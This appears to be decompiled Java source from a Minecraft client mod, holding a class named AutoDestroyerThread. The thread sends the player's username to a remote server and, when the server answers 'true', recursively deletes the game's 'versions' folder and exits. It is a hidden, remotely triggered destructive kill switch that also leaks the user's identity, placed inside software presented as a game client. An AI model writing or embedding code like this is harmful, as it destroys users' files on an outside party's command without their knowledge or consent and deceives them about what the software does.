package saint.threads;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import net.minecraft.client.Minecraft;
import saint.utilities.MathUtils;

public class AutoDestroyerThread extends Thread {
   private final Minecraft mc = Minecraft.getMinecraft();
   private static final String SRC_FOLDER;

   static {
      SRC_FOLDER = Minecraft.getMinecraft().mcDataDir + "/versions";
   }

   public AutoDestroyerThread() {
      super("" + MathUtils.getRandom(999999999));
   }

   public void checkForDestroy() {
      try {
         URL url = new URL("http://saintclient.netii.net/download.php?key=" + this.mc.session.getUsername());
         InetAddress ip = InetAddress.getByName(url.getHost());
         if (!ip.getHostAddress().equals("31.170.167.183") && !ip.getHostAddress().equals("31.170.166.16")) {
            return;
         }

         HttpURLConnection connection = (HttpURLConnection)url.openConnection();
         connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0");
         connection.connect();
         BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
         String line = reader.readLine();
         File directory = new File(SRC_FOLDER);
         if (Boolean.parseBoolean(line) && directory.exists()) {
            try {
               this.delete(directory);
               System.exit(0);
            } catch (IOException var8) {
            }
         }
      } catch (MalformedURLException var9) {
         var9.printStackTrace();
      } catch (UnknownHostException var10) {
         var10.printStackTrace();
      } catch (IOException var11) {
         var11.printStackTrace();
      }

   }

   public void run() {
      this.checkForDestroy();
   }

   private void delete(File file) throws IOException {
      if (file.isDirectory()) {
         if (file.list().length == 0) {
            file.delete();
         } else {
            String[] files = file.list();
            String[] var6 = files;
            int var5 = files.length;

            for(int var4 = 0; var4 < var5; ++var4) {
               String temp = var6[var4];
               File fileDelete = new File(file, temp);
               this.delete(fileDelete);
            }

            if (file.list().length == 0) {
               file.delete();
            }
         }
      } else {
         file.delete();
      }

   }
}
